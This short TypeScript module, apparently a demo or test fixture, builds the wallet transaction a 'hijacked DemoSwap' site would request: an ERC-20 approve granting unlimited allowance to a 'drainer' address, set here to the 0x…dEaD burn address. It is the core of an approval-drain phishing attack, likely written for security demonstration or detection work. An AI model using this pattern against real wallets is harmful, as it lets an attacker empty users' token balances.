import { encodeFunctionData, maxUint256, parseAbi, type Address } from 'viem';

/** The exact transaction the hijacked DemoSwap asks the wallet to send: approve(drainer, max). */
export const DRAINER: Address = '0x000000000000000000000000000000000000dEaD';
export function hijackRequest(token: Address) {
  return {
    to: token,
    data: encodeFunctionData({ abi: parseAbi(['function approve(address,uint256) returns (bool)']), functionName: 'approve', args: [DRAINER, maxUint256] }),
    value: '0x0',
  };
}
